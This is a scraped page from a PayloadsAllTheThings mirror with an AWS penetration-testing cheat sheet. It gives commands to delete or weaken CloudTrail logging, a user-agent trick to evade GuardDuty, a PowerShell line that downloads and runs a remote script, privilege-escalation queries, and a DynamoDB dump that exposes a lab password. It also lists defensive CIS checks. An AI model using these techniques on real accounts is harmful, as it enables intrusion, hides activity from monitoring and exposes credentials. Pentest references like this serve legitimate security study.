secrets&#39;, expects secretsdump to be on path Disable CloudTrail 1 $ aws cloudtrail delete-trail --name cloudgoat_trail --profile administrator Disable monitoring of events from global services 1 $ aws cloudtrail update-trail --name cloudgoat_trail --no-include-global-service-event Disable Cloud Trail on specific regions 1 $ aws cloudtrail update-trail --name cloudgoat_trail --no-include-global-service-event --no-is-multi-region --region=eu-west Cover tracks by obfuscating Cloudtrail logs and Guard Duty :warning: When using awscli on Kali Linux, Pentoo and Parrot Linux, a log is generated based on the user-agent. Pacu bypass this problem by defining a custom User-Agent (https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu.py#L1473) 1 2 3 4 5 boto3_session = boto3.session.Session() ua = boto3_session._session.user_agent() if &#39;kali&#39; in ua.lower() or &#39;parrot&#39; in ua.lower() or &#39;pentoo&#39; in ua.lower(): # If the local OS is Kali/Parrot/Pentoo Linux # GuardDuty triggers a finding around API calls made from Kali Linux, so let&#39;s avoid that... self.print(&#39;Detected environment as one of Kali/Parrot/Pentoo Linux. Modifying user agent to hide that from GuardDuty...&#39;) DynamoDB Amazon DynamoDB is a key-value and document database that delivers single-digit millisecond performance at any scale. It’s a fully managed, multi-region, multi-active, durable database with built-in security, backup and restore, and in-memory caching for internet-scale applications. DynamoDB can handle more than 10 trillion requests per day and can support peaks of more than 20 million requests per second. list tables ```bash $ aws –endpoint-url http://s3.bucket.htb dynamodb list-tables { “TableNames”: [ “users” ] } 1 2 3 4 5 6 7 8 9 10 11 12 13 * enumerate table content ```bash $ aws --endpoint-url http://s3.bucket.htb dynamodb scan --table-name users | jq -r &#39;.Items[]&#39; { &quot;password&quot;: { &quot;S&quot;: &quot;Management@#1@#&quot; }, &quot;username&quot;: { &quot;S&quot;: &quot;Mgmt&quot; } } Security checks https://github.com/DenizParlak/Zeus Identity and Access Management Avoid the use of the “root” account Ensure multi-factor authentication (MFA) is enabled for all IAM users that have a console password Ensure credentials unused for 90 days or greater are disabled Ensure access keys are rotated every 90 days or less Ensure IAM password policy requires at least one uppercase letter Ensure IAM password policy requires at least one lowercase letter Ensure IAM password policy requires at least one symbol Ensure IAM password policy requires at least one number Ensure IAM password policy requires minimum length of 14 or greater Ensure no root account access key exists Ensure MFA is enabled for the “root” account Ensure security questions are registered in the AWS account Ensure IAM policies are attached only to groups or role Enable detailed billing Maintain current contact details Ensure security contact information is registered Ensure IAM instance roles are used for AWS resource access from instances Logging Ensure CloudTrail is enabled in all regions Ensure CloudTrail log file validation is enabled Ensure the S3 bucket CloudTrail logs to is not publicly accessible Ensure CloudTrail trails are integrated with CloudWatch Logs Ensure AWS Config is enabled in all regions Ensure S3 bucket access logging is enabled on the CloudTrail S3 bucket Ensure CloudTrail logs are encrypted at rest using KMS CMKs Ensure rotation for customer created CMKs is enabled Networking Ensure no security groups allow ingress from 0.0.0.0/0 to port 22 Ensure no security groups allow ingress from 0.0.0.0/0 to port 3389 Ensure VPC flow logging is enabled in all VPC Ensure the default security group of every VPC restricts all traffic Monitoring Ensure a log metric filter and alarm exist for unauthorized API calls Ensure a log metric filter and alarm exist for Management Consolesign-in without MFA Ensure a log metric filter and alarm exist for usage of “root” account Ensure a log metric filter and alarm exist for IAM policy changes Ensure a log metric filter and alarm exist for CloudTrail configuration changes Ensure a log metric filter and alarm exist for AWS Management Console authentication failures Ensure a log metric filter and alarm exist for disabling or scheduled deletion of customer created CMKs Ensure a log metric filter and alarm exist for S3 bucket policy changes Ensure a log metric filter and alarm exist for AWS Config configuration changes Ensure a log metric filter and alarm exist for security group changes Ensure a log metric filter and alarm exist for changes to NetworkAccess Control Lists (NACL) Ensure a log metric filter and alarm exist for changes to network gateways Ensure a log metric filter and alarm exist for route table changes Ensure a log metric filter and alarm exist for VPC changes References An introduction to penetration testing AWS - Graceful Security Cloud Shadow Admin Threat 10 Permissions Protect - CyberArk My arsenal of AWS Security tools - toniblyx AWS Privilege Escalation method mitigation - RhinoSecurityLabs AWS CLI Cheatsheet - apolloclark Pacu Open source AWS Exploitation framework - RhinoSecurityLabs PACU Spencer Gietzen - 30 juil. 2018 Cloud security instance metadata - PumaScan Privilege escalation in the Cloud: From SSRF to Global Account Administrator - Maxime Leblanc - Sep 1, 2018 AWS - Cheatsheet - @Magnussen amazon-guardduty-user-guide PenTest Finding Types - @awsdocs HOW I HACKED A WHOLE EC2 NETWORK DURING A PENETRATION TEST - by Federico Fernandez How to Attach and Mount an EBS volume to EC2 Linux Instance - AUGUST 17, 2016 Getting shell and data access in AWS by chaining vulnerabilities - Riyaz Walikar - Aug 29, 2019 Getting started with Version 2 of AWS EC2 Instance Metadata service (IMDSv2) - Sunesh Govindaraj - Nov 25, 2019 Gaining AWS Console Access via API Keys - Ian Williams - March 18th, 2020 AWS API calls that return credentials - kmcquade","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


  <title>AWS | PayloadsAllTheThings
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="PayloadsAllTheThings">
<meta name="application-name" content="PayloadsAllTheThings">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
  <link rel="dns-prefetch" href="https://fonts.gstatic.com">

  <!-- Google Tag and Analytics -->
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-BJ57VSC3B5"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-BJ57VSC3B5');
</script>
<!-- Translate website -->
<script>
/*
  function googleTranslateElementInit() {

  new google.translate.TranslateElement(
    {
      pageLanguage: "en",
      includedLanguages: "en,id",
      layout: google.translate.TranslateElement.InlineLayout.SIMPLE
    },
    "google_translate_element"
  );
}
setTimeout( function() {
  googleTranslateElementInit();
  }, 500);
*/
</script>
  <!-- GA -->
  

  <!-- jsDelivr CDN -->
  <link rel="preconnect" href="https://cdn.jsdelivr.net">
  <link rel="dns-prefetch" href="https://cdn.jsdelivr.net">

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css">

  <!--
  CSS selector for site.
-->

<link rel="stylesheet" href="/assets/css/style.css">


  <link rel="stylesheet"
    href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">



  <!-- Manific Popup -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">



  <!-- JavaScripts -->
<!-- <script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script> -->
  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

  <script defer
    src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script>

  <!--
  JS selector for site.
-->


  



  <!-- image lazy-loading & popup -->
  <script async
    src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script>





<script defer src="/assets/js/dist/post.min.js"></script>





</head>


  <body data-spy="scroll" data-target="#toc">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">

  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" alt="avatar" class="mx-auto">
        
        <img src="/assets/img/logo.jpg" alt="avatar" onerror="this.style.display='none'">
      </a>
    </div>

    <div class="site-title mt-3">
      <a href="/">PayloadsAllTheThings</a>
    </div>

    <div class="site-subtitle font-italic">A list of useful payloads</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">
    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i>
        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i>
        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center">

    
      

      
      <a href="https://github.com/Zxce3" aria-label="github"
        class="order-3"
        target="_blank" rel="noopener">
        <i class="fab fa-github-alt"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/Zxce3_" aria-label="twitter"
        class="order-4"
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['Zxce3','protonmail.com'].join('@')" aria-label="email"
        class="order-5"
        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        class="order-6"
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

    
      
        <span class="icon-border order-2"></span>
      

      <span id="mode-toggle-wrapper" class="order-1">
        <!--
  Switch the mode between dark and light.
-->

<i class="mode-toggle fas fa-adjust"></i>

<script type="text/javascript">

  class ModeToggle {
    static get MODE_KEY() { return "mode"; }
    static get DARK_MODE() { return "dark"; }
    static get LIGHT_MODE() { return "light"; }

    constructor() {
      if (this.hasMode) {
        if (this.isDarkMode) {
          if (!this.isSysDarkPrefer) {
            this.setDark();
          }
        } else {
          if (this.isSysDarkPrefer) {
            this.setLight();
          }
        }
      }

      var self = this;

      /* always follow the system prefers */
      this.sysDarkPrefers.addListener(function() {
        if (self.hasMode) {
          if (self.isDarkMode) {
            if (!self.isSysDarkPrefer) {
              self.setDark();
            }

          } else {
            if (self.isSysDarkPrefer) {
              self.setLight();
            }
          }

          self.clearMode();
        }

        self.updateMermaid();
      });

    } /* constructor() */


    setDark() {
      $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
    }

    setLight() {
      $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
    }

    clearMode() {
      $('html').removeAttr(ModeToggle.MODE_KEY);
      sessionStorage.removeItem(ModeToggle.MODE_KEY);
    }

    get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); }

    get isSysDarkPrefer() { return this.sysDarkPrefers.matches; }

    get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; }

    get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; }

    get hasMode() { return this.mode != null; }

    get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); }

    /* get the current mode on screen */
    get modeStatus() {
      if (this.isDarkMode
        || (!this.hasMode && this.isSysDarkPrefer) ) {
        return ModeToggle.DARK_MODE;
      } else {
        return ModeToggle.LIGHT_MODE;
      }
    }

    updateMermaid() {
      if (typeof mermaid !== "undefined") {
        let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default");
        let config = { theme: expectedTheme };

        /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */
        $(".mermaid").each(function() {
          let svgCode = $(this).prev().children().html();
          $(this).removeAttr("data-processed");
          $(this).html(svgCode);
        });

        mermaid.initialize(config);
        mermaid.init(undefined, ".mermaid");
      }
    }

    flipMode() {
      if (this.hasMode) {
        if (this.isSysDarkPrefer) {
          if (this.isLightMode) {
            this.clearMode();
          } else {
            this.setLight();
          }

        } else {
          if (this.isDarkMode) {
            this.clearMode();
          } else {
            this.setDark();
          }
        }

      } else {
        if (this.isSysDarkPrefer) {
          this.setLight();
        } else {
          this.setDark();
        }
      }

      this.updateMermaid();

    } /* flipMode() */

  } /* ModeToggle */

  let toggle = new ModeToggle();

  $(".mode-toggle").click(function() {

    toggle.flipMode();

  });

</script>

      </span>
    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper" class="row justify-content-center topbar-down">
  <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
    <span id="breadcrumb">

    

    

      

        
          

        

      

        
          <span>AWS</span>

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
      <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i>
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper">
      <div id="main">

        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->


<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->


<!-- Add attribute 'hide-bullet' to the checkbox list -->






<!-- return -->
<div class="row">

  <div id="post-wrapper" class="col-12 col-lg-11 col-xl-8">

    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

      <h1 data-toc-skip>AWS</h1>

      <div class="post-meta text-muted d-flex flex-column">
        <!-- Published date and author -->
        <div>
          <span class="semi-bold">
            Zxce3
          </span>
          <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago "
  
    data-toggle="tooltip"
    data-placement="bottom"
    title="Sat, May  1, 2021, 12:00 AM +0700"
  

  
  prep="on" >

  
  

  
    May  1, 2021
  

  <i class="unloaded">2021-05-01T00:00:00+07:00</i>

</span>

        </div>

        <div>
          <!-- lastmod -->
          

          <!-- read time -->
          <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->


<!-- words per minute  -->







<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3662 words">20 min reads</span>


          <!-- page views -->
          

        </div>

      </div> <!-- .post-meta -->

      <div class="post-content">

        

        <blockquote>
  <p>Amazon Web Services offers reliable, scalable, and inexpensive cloud computing services.</p>
</blockquote>

<h2 id="summary">Summary</h2>

<ul>
  <li><a href="#aws">AWS</a>
    <ul>
      <li><a href="#summary">Summary</a></li>
      <li><a href="#training">Training</a></li>
      <li><a href="#tools">Tools</a></li>
      <li><a href="#aws-patterns">AWS Patterns</a></li>
      <li><a href="#aws---metadata-ssrf">AWS - Metadata SSRF</a>
        <ul>
          <li><a href="#method-for-elastic-cloud-compute-ec2">Method for Elastic Cloud Compute (EC2)</a></li>
          <li><a href="#method-for-container-service-fargate">Method for Container Service (Fargate)</a></li>
          <li><a href="#aws-api-calls-that-return-credentials">AWS API calls that return credentials</a></li>
        </ul>
      </li>
      <li><a href="#aws---shadow-admin">AWS - Shadow Admin</a>
        <ul>
          <li><a href="#admin-equivalent-permission">Admin equivalent permission</a></li>
        </ul>
      </li>
      <li><a href="#aws---gaining-aws-console-access-via-api-keys">AWS - Gaining AWS Console Access via API Keys</a></li>
      <li><a href="#aws---enumerate-iam-permissions">AWS - Enumerate IAM permissions</a></li>
      <li><a href="#aws---mount-ebs-volume-to-ec2-linux">AWS - Mount EBS volume to EC2 Linux</a></li>
      <li><a href="#aws---copy-ec2-using-ami-image">AWS - Copy EC2 using AMI Image</a></li>
      <li><a href="#aws---instance-connect---push-an-ssh-key-to-ec2-instance">AWS - Instance Connect - Push an SSH key to EC2 instance</a></li>
      <li><a href="#aws---lambda---extract-functions-code">AWS - Lambda - Extract function’s code</a></li>
      <li><a href="#aws---ssm---command-execution">AWS - SSM - Command execution</a></li>
      <li><a href="#aws---golden-saml-attack">AWS - Golden SAML Attack</a></li>
      <li><a href="#aws---shadow-copy-attack">AWS - Shadow Copy attack</a></li>
      <li><a href="#disable-cloudtrail">Disable CloudTrail</a></li>
      <li><a href="#cover-tracks-by-obfuscating-cloudtrail-logs-and-guard-duty">Cover tracks by obfuscating Cloudtrail logs and Guard Duty</a></li>
      <li><a href="#dynamodb">DynamoDB</a></li>
      <li><a href="#security-checks">Security checks</a></li>
      <li><a href="#references">References</a></li>
    </ul>
  </li>
</ul>

<h2 id="training">Training</h2>

<ul>
  <li>Damn Vulnerable Cloud Application - https://medium.com/poka-techblog/privilege-escalation-in-the-cloud-from-ssrf-to-global-account-administrator-fd943cf5a2f6</li>
  <li>SadCloud - https://github.com/nccgroup/sadcloud</li>
  <li>Flaws - http://flaws.cloud</li>
</ul>

<h2 id="tools">Tools</h2>

<ul>
  <li><a href="https://github.com/cyberark/SkyArk">SkyArk</a> - Discover the most privileged users in the scanned AWS environment, including the AWS Shadow Admins
    <ul>
      <li>Requires read-Only permissions over IAM service
  ```powershell
  $ git clone https://github.com/cyberark/SkyArk
  $ powershell -ExecutionPolicy Bypass -NoProfile
  PS C&gt; Import-Module .\SkyArk.ps1 -force
  PS C&gt; Start-AWStealth</li>
    </ul>

    <p>or in the Cloud Console</p>

    <p>PS C&gt; IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/cyberark/SkyArk/master/AWStealth/AWStealth.ps1’)<br />
  PS C&gt; Scan-AWShadowAdmins<br />
  ```</p>
  </li>
  <li><a href="https://github.com/RhinoSecurityLabs/pacu">Pacu</a> - Exploit configuration flaws within an AWS environment using an extensible collection of modules with a diverse feature-set
    <ul>
      <li>Requires AWS Keys
  ```powershell
  $ git clone https://github.com/RhinoSecurityLabs/pacu
  $ bash install.sh
  $ python3 pacu.py
  set_keys/swap_keys
  ls
  run <module_name> [--keyword-arguments]
  run <module_name> --regions eu-west-1,us-west-1</module_name></module_name></li>
    </ul>

    <p># https://github.com/RhinoSecurityLabs/pacu/wiki/Module-Details
  ```</p>
  </li>
  <li><a href="https://digi.ninja/projects/bucket_finder.php">Bucket Finder</a> - Search for public buckets, list and download all files if directory indexing is enabled
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="n">wget</span><span class="w"> </span><span class="nx">https://digi.ninja/files/bucket_finder_1.1.tar.bz2</span><span class="w"> </span><span class="nt">-O</span><span class="w"> </span><span class="nx">bucket_finder_1.1.tar.bz2</span><span class="w">
  </span><span class="o">.</span><span class="n">/bucket_finder.rb</span><span class="w"> </span><span class="nx">my_words</span><span class="w">
  </span><span class="o">.</span><span class="n">/bucket_finder.rb</span><span class="w"> </span><span class="nt">--region</span><span class="w"> </span><span class="nx">ie</span><span class="w"> </span><span class="nx">my_words</span><span class="w">
      </span><span class="n">US</span><span class="w"> </span><span class="nx">Standard</span><span class="w">         </span><span class="o">=</span><span class="w"> </span><span class="n">http://s3.amazonaws.com</span><span class="w">
      </span><span class="nx">Ireland</span><span class="w">             </span><span class="o">=</span><span class="w"> </span><span class="n">http://s3-eu-west-1.amazonaws.com</span><span class="w">
      </span><span class="nx">Northern</span><span class="w"> </span><span class="nx">California</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">http://s3-us-west-1.amazonaws.com</span><span class="w">
      </span><span class="nx">Singapore</span><span class="w">           </span><span class="o">=</span><span class="w"> </span><span class="n">http://s3-ap-southeast-1.amazonaws.com</span><span class="w">
      </span><span class="nx">Tokyo</span><span class="w">               </span><span class="o">=</span><span class="w"> </span><span class="n">http://s3-ap-northeast-1.amazonaws.com</span><span class="w">

  </span><span class="o">.</span><span class="n">/bucket_finder.rb</span><span class="w"> </span><span class="nt">--download</span><span class="w"> </span><span class="nt">--region</span><span class="w"> </span><span class="nx">ie</span><span class="w"> </span><span class="nx">my_words</span><span class="w">
  </span><span class="o">.</span><span class="n">/bucket_finder.rb</span><span class="w"> </span><span class="nt">--log-file</span><span class="w"> </span><span class="nx">bucket.out</span><span class="w"> </span><span class="nx">my_words</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><a href="https://boto3.amazonaws.com/v1/documentation/api/latest/index.html">Boto3</a> - Amazon Web Services (AWS) SDK for Python
    <div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>  <span class="kn">import</span> <span class="nn">boto3</span>
  <span class="c1"># Create an S3 client
</span>  <span class="n">s3</span> <span class="o">=</span> <span class="n">boto3</span><span class="p">.</span><span class="n">client</span><span class="p">(</span><span class="s">'s3'</span><span class="p">,</span><span class="n">aws_access_key_id</span><span class="o">=</span><span class="s">'AKIAJQDP3RKREDACTED'</span><span class="p">,</span><span class="n">aws_secret_access_key</span><span class="o">=</span><span class="s">'igH8yFmmpMbnkcUaCqXJIRIozKVaREDACTED'</span><span class="p">,</span><span class="n">region_name</span><span class="o">=</span><span class="s">'us-west-1'</span><span class="p">)</span>

  <span class="k">try</span><span class="p">:</span>
      <span class="n">result</span> <span class="o">=</span> <span class="n">s3</span><span class="p">.</span><span class="n">list_buckets</span><span class="p">()</span>
      <span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
  <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
      <span class="k">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>
    <p><a href="https://github.com/toniblyx/prowler">Prowler</a> - AWS security best practices assessments, audits, incident response, continuous monitoring, hardening and forensics readiness</p>

    <blockquote>
      <p>It follows guidelines of the CIS Amazon Web Services Foundations Benchmark and DOZENS of additional checks including GDPR and HIPAA (+100).</p>
      <ul>
        <li>Require: arn:aws:iam::aws:policy/SecurityAudit</li>
      </ul>
    </blockquote>

    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="err">$</span><span class="w"> </span><span class="n">pip</span><span class="w"> </span><span class="nx">install</span><span class="w"> </span><span class="nx">awscli</span><span class="w"> </span><span class="nx">ansi2html</span><span class="w"> </span><span class="nx">detect-secrets</span><span class="w">
  </span><span class="err">$</span><span class="w"> </span><span class="n">git</span><span class="w"> </span><span class="nx">clone</span><span class="w"> </span><span class="nx">https://github.com/toniblyx/prowler</span><span class="w">
  </span><span class="err">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="nx">apt</span><span class="w"> </span><span class="nx">install</span><span class="w"> </span><span class="nx">jq</span><span class="w">
  </span><span class="err">$</span><span class="w"> </span><span class="o">.</span><span class="n">/prowler</span><span class="w"> </span><span class="nt">-E</span><span class="w"> </span><span class="nx">check42</span><span class="p">,</span><span class="nx">check43</span><span class="w">
  </span><span class="err">$</span><span class="w"> </span><span class="o">.</span><span class="n">/prowler</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">custom-profile</span><span class="w"> </span><span class="nt">-r</span><span class="w"> </span><span class="nx">us-east-1</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">check11</span><span class="w">
  </span><span class="err">$</span><span class="w"> </span><span class="o">.</span><span class="n">/prowler</span><span class="w"> </span><span class="nt">-A</span><span class="w"> </span><span class="nx">123456789012</span><span class="w"> </span><span class="nt">-R</span><span class="w"> </span><span class="nx">ProwlerRole</span><span class="w">  </span><span class="c"># sts assume-role</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><a href="https://github.com/nccgroup/PMapper">Principal Mapper</a> - A tool for quickly evaluating IAM permissions in AWS
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="n">https://github.com/nccgroup/PMapper</span><span class="w">
  </span><span class="nx">pip</span><span class="w"> </span><span class="nx">install</span><span class="w"> </span><span class="nx">principalmapper</span><span class="w">
  </span><span class="n">pmapper</span><span class="w"> </span><span class="nx">graph</span><span class="w"> </span><span class="nt">--create</span><span class="w">
  </span><span class="n">pmapper</span><span class="w"> </span><span class="nx">visualize</span><span class="w"> </span><span class="nt">--filetype</span><span class="w"> </span><span class="nx">png</span><span class="w">
  </span><span class="n">pmapper</span><span class="w"> </span><span class="nx">analysis</span><span class="w"> </span><span class="nt">--output-type</span><span class="w"> </span><span class="nx">text</span><span class="w">

  </span><span class="c"># Determine if PowerUser can escalate privileges</span><span class="w">
  </span><span class="n">pmapper</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"preset privesc user/PowerUser"</span><span class="w">
  </span><span class="n">pmapper</span><span class="w"> </span><span class="nx">argquery</span><span class="w"> </span><span class="nt">--principal</span><span class="w"> </span><span class="nx">user/PowerUser</span><span class="w"> </span><span class="nt">--preset</span><span class="w"> </span><span class="nx">privesc</span><span class="w">

  </span><span class="c"># Find all principals that can escalate privileges</span><span class="w">
  </span><span class="n">pmapper</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"preset privesc *"</span><span class="w">
  </span><span class="n">pmapper</span><span class="w"> </span><span class="nx">argquery</span><span class="w"> </span><span class="nt">--principal</span><span class="w"> </span><span class="s1">'*'</span><span class="w"> </span><span class="nt">--preset</span><span class="w"> </span><span class="nx">privesc</span><span class="w">

  </span><span class="c"># Find all principals that PowerUser can access</span><span class="w">
  </span><span class="n">pmapper</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"preset connected user/PowerUser *"</span><span class="w">
  </span><span class="n">pmapper</span><span class="w"> </span><span class="nx">argquery</span><span class="w"> </span><span class="nt">--principal</span><span class="w"> </span><span class="nx">user/PowerUser</span><span class="w"> </span><span class="nt">--resource</span><span class="w"> </span><span class="s1">'*'</span><span class="w"> </span><span class="nt">--preset</span><span class="w"> </span><span class="nx">connected</span><span class="w">

  </span><span class="c"># Find all principals that can access PowerUser</span><span class="w">
  </span><span class="n">pmapper</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"preset connected * user/PowerUser"</span><span class="w">
  </span><span class="n">pmapper</span><span class="w"> </span><span class="nx">argquery</span><span class="w"> </span><span class="nt">--principal</span><span class="w"> </span><span class="s1">'*'</span><span class="w"> </span><span class="nt">--resource</span><span class="w"> </span><span class="nx">user/PowerUser</span><span class="w"> </span><span class="nt">--preset</span><span class="w"> </span><span class="nx">connected</span><span class="w">
</span></pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li><a href="https://github.com/nccgroup/ScoutSuite/wiki">ScoutSuite</a> - Multi-Cloud Security Auditing Tool
    <div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="w">  </span><span class="err">$</span><span class="w"> </span><span class="n">git</span><span class="w"> </span><span class="nx">clone</span><span class="w"> </span><span class="nx">https://github.com/nccgroup/ScoutSuite</span><span class="w">
  </span><span class="err">$</span><span class="w"> </span><span class="n">python</span><span class="w"> </span><span class="nx">scout.py</span><span class="w"> </span><span class="nx">PROVIDER</span><span class="w"> </span><span class="nt">--help</span><span class="w">
  </span><span class="c"># The --session-token is optional and only used for temporary credentials (i.e. role assumption).</span><span class="w">
